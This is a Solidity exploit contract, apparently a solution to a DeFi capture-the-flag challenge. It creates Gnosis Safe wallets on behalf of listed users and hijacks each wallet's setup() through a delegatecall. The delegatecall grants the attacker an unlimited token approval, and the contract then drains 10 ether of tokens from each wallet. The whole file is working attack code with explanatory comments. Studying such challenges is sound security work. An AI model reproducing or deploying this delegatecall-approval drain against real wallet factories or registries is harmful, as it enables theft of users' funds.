pragma solidity ^0.8.0;
import "./GnosisSafeProxy.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
interface ProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

interface IProxyCreationCallback {
    function proxyCreated(
        GnosisSafeProxy proxy,
        address _singleton,
        bytes calldata initializer,
        uint256 saltNonce
    ) external;
}

contract WalletAttacker {

    address public masterCopy;
    address public walletRegistry;
    ProxyFactory public proxyFactory;

    constructor(address _mc, address _wr, address _pf) {
        masterCopy = _mc;
        walletRegistry = _wr;
        proxyFactory = ProxyFactory(_pf);
    }

    // This will be called on Proxy setup()
    function approve(address _token, address _target) external {
        // can't just pass address(this) since it's modified through the delegation call's context
        IERC20(_token).approve(_target, type(uint256).max);
        // IERC20(_token).transfer(_target, 10 ether);
    }

    /**
        The delegation order is the following:
        1. create payload that approves transfer of token; the GnosisSafe:setup() will call it.
        2. create the proxy via createProxyWithCallback().
        3. call the setup() via the proxy.    
     */
    function exploit(address _token, address[] calldata _users) external {
        for(uint256 i = 0; i < _users.length; i++) {

            address _user = _users[i];
            address[] memory owners = new address[](1);

            // owner has to be index 0
            owners[0] = _user;

            // 1. payload that setup() will call.
            bytes memory payloadApprove = abi.encodeWithSignature(
                "approve(address,address)",
                _token,
                address(this)
            );

            // 2. call the setup().
            // function setup(
            //     address[] calldata _owners,
            //     uint256 _threshold,
            //     address to,
            //     bytes calldata data,
            //     address fallbackHandler,
            //     address paymentToken,
            //     uint256 payment,
            //     address payable paymentReceiver
            // ) external
            bytes memory payloadSetup = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                payloadApprove,
                address(0),
                address(0),
                0,
                address(0)
            );

            // calls setup() which will then call approve()
            GnosisSafeProxy _proxy = proxyFactory.createProxyWithCallback(
                masterCopy,
                payloadSetup,
                0,
                IProxyCreationCallback(walletRegistry) // calls proxyCreated which will in turn change ownership
            );
            
            // funds have been approved through delegation, so we can transfer them now
            IERC20(_token).transferFrom(address(_proxy), msg.sender, 10 ether);
        }
    }
}